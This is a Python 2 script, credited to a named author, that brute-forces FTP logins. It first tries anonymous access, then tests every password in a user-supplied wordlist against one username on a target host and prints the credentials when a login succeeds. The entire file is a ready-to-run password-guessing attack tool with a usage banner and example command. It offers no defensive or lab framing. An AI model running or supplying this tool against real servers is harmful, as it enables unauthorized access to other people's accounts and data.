#Created By: Milad Khoshdel
#Special Thanks: Mikili
#Blog: https://blog.regux.com
#Email: miladkhoshdel@gmail.com
#Telegram: @miladkho5hdel

import argparse
import sys
from ftplib import FTP

def banner():
	print(' ')
	print(' #######################################################################################')
	print(' ##                                                                                   ##')
	print(' ##                         __  __ ___ _      _   __  __ ___ _  __                    ##')
	print(' ##                        |  \/  |_ _| |    /_\ |  \/  |_ _| |/ /                    ##')
	print(" ##                        | |\/| || || |__ / _ \| |\/| || || ' <                     ##")
	print(' ##                        |_|  |_|___|____/_/ \_\_|  |_|___|_|\_\                    ##')
	print(' ##                                                                                   ##')
	print(' ##                                                    BY: Milad Khoshdel | Mikili    ##')
	print(' ##                                                    Blog: https://blog.regux.com   ##')
	print(' ##                                                                                   ##')
	print(' #######################################################################################')
	print(' ')	
	print('  Usage: ./ftp_brute_forcer.py [options]')
	print(' ')
	print('  Options: -t, --target    <hostname/ip>   |   Target')
	print('           -u, --user      <user>          |   User')
	print('           -w, --wordlist  <filename>      |   Wordlist')
	print('           -s, --timeout   <timeout>       |   Set Timeout')
	print('           -h, --help      <help>          |   print help')
	print(' ')
	print('  Example: ./ftp_brute_forcer.py -t 192.168.1.1 -s 0.5 -u user -w /var/wordlist.txt')
	print('	')


def check_anonymous(t,s):
    try:
        print('[-] checking user [anonymous] with password [anonymous]' )
        anonymous = FTP(t ,21,timeout=s)
        anonymous.login()
        print "Username [anonymous] with password [anonymous] is available."
        anonymous.quit()
    except:
        pass

def login(t, u, p, s):
    try:
        print('[-] checking user [' + u + '] with password [' + p + ']' )
        ftpcheck = FTP(t ,21,timeout=s)
        ftpcheck.login(u, p)
        print "\n[+] Credentials have found successfully."
        print "\n[+] Username : {}".format(u)
        print "\n[+] Password : {}".format(p)
        ftpcheck.quit()
        sys.exit(0)
    except:
        pass
		
def attack(t, u, w, s):
    try:
        wordlist = open(w, "r")
        passwords = wordlist.readlines()
        for w in passwords:
            w = w.strip()
            login(t, u, w, s)
    except:
		print "\n Please Check your wordlist. \n"
		sys.exit(0)


parser = argparse.ArgumentParser()
parser.add_argument("-t", "--target")
parser.add_argument("-u", "--username")
parser.add_argument("-w", "--wordlist")
parser.add_argument("-s", "--timeout")
args = parser.parse_args()

if not args.target or not args.username or not args.wordlist or not args.timeout:
    banner()
    sys.exit(0)

target = args.target
username = args.username
wordlist = args.wordlist
sleep = args.timeout
sleep = float(sleep)

check_anonymous(target,sleep)
attack(target, username, wordlist, sleep)
print('----------------------------------------------------')
print(' We are so sorry, Creadential was not in wordlist.  ')
print('----------------------------------------------------')


